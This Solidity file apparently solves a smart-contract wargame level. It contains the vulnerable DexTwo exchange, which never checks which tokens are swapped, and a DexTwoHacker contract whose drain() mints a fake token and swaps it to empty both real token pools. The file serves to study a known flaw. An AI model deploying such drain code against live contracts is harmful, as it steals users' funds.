// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import '@openzeppelin/contracts/access/Ownable.sol';

contract DexTwo is Ownable {
  address public token1;
  address public token2;
  constructor() {}

  function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
  }

  function add_liquidity(address token_address, uint amount) public onlyOwner {
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }
  
  function swap(address from, address to, uint amount) public {
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapAmount(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  } 

  function getSwapAmount(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableTokenTwo(token1).approve(msg.sender, spender, amount);
    SwappableTokenTwo(token2).approve(msg.sender, spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableTokenTwo is ERC20 {
  address private _dex;
  constructor(address dexInstance, string memory name, string memory symbol, uint initialSupply) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
  }

  function approve(address owner, address spender, uint256 amount) public {
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
}

//   function swap(address from, address to, uint amount) public {
//     require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
//     uint swapAmount = getSwapAmount(from, to, amount);
//     IERC20(from).transferFrom(msg.sender, address(this), amount);
//     IERC20(to).approve(address(this), swapAmount);
//     IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
//   } 
contract FakeToken is ERC20 {
    constructor (string memory name, string memory symbol,  uint initialSupply) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
    }
}

contract DexTwoHacker {
    DexTwo dexTwo;
  constructor(address _dexTwo) {
    dexTwo = DexTwo(_dexTwo);
  }    
  function drain() external {
    ERC20 fakeToken = new FakeToken("FakeToken", "FT", 4);
    fakeToken.approve(address(dexTwo), type(uint).max);
    fakeToken.transfer(address(dexTwo), 1);
    dexTwo.swap(address(fakeToken), dexTwo.token1(), 1);
    dexTwo.swap(address(fakeToken), dexTwo.token2(), 2);
    require((ERC20(dexTwo.token1()).balanceOf(address(dexTwo)) == 0)&&(ERC20(dexTwo.token2()).balanceOf(address(dexTwo)) == 0), "Drain filed");
  }
}